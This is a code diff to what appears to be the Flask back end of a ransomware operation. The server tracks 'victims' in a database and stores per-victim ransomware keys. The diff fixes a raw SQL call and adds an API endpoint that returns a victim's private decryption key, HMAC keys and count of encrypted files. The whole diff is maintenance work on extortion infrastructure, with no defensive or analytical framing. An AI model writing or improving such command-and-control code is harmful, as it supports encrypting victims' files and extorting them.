@@ -90,18 +90,20 @@ class RansomwareKey(db.Model):
 # ------------------------------------------------------------------
 # Database Initialization
 # ------------------------------------------------------------------
+from sqlalchemy import text  # add at the top with other imports
+
 with app.app_context():
     try:
         db.create_all()
-        # Quick check if victims table exists
-        result = db.session.execute("SELECT name FROM sqlite_master WHERE type='table' AND name='victims';").fetchone()
+        # Use text() for raw SQL
+        result = db.session.execute(text("SELECT name FROM sqlite_master WHERE type='table' AND name='victims';")).fetchone()
         if result:
             logging.info("✅ Database initialized successfully. Victims table exists.")
         else:
             logging.warning("⚠️ Victims table not found after create_all. Check database path.")
     except Exception as e:
         logging.error(f"❌ Database initialization error: {e}")
-
+        
 # ------------------------------------------------------------------
 # Helper: update victim last_seen
 # ------------------------------------------------------------------
@@ -375,6 +377,27 @@ def get_stats():
         })
     except Exception as e:
         logging.error(f"Stats error: {e}")
+        return jsonify({'error': str(e)}), 500
+        
+        
+@app.route('/api/decryption_keys/<victim_id>', methods=['GET'])
+def get_decryption_keys(victim_id):
+    try:
+        rk = RansomwareKey.query.filter_by(victim_id=victim_id).first()
+        if rk:
+            hmac_keys = {}
+            try:
+                hmac_keys = json.loads(rk.hmac_keys) if rk.hmac_keys else {}
+            except:
+                pass
+            return jsonify({
+                'exists': True,
+                'private_key': rk.private_key,
+                'hmac_keys': hmac_keys,
+                'files_encrypted': rk.files_encrypted
+            })
+        return jsonify({'exists': False}), 404
+    except Exception as e:
         return jsonify({'error': str(e)}), 500
 
 # ------------------------------------------------------------------
